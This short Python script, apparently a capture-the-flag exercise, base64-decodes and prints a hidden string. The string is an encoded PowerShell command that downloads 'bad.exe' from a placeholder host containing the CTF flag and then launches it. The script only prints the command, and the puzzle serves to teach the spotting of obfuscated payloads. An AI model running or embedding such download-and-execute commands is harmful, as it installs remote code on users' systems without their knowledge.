import base64
if __name__ == "__main__":    
    encoded_cmd = "TmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCkuRG93bmxvYWRGaWxlKCdodHRwOi8vTWV0YUNURntzdXBlcl9zdXNfc3Q0Z2luZ19zaXRlX2QwdF9jMG19L19iYWQuZXhlJywnYmFkLmV4ZScpO1N0YXJ0LVByb2Nlc3MgJ2JhZC5leGUn"
    decoded_cmd = base64.b64decode(encoded_cmd)
    print(decoded_cmd)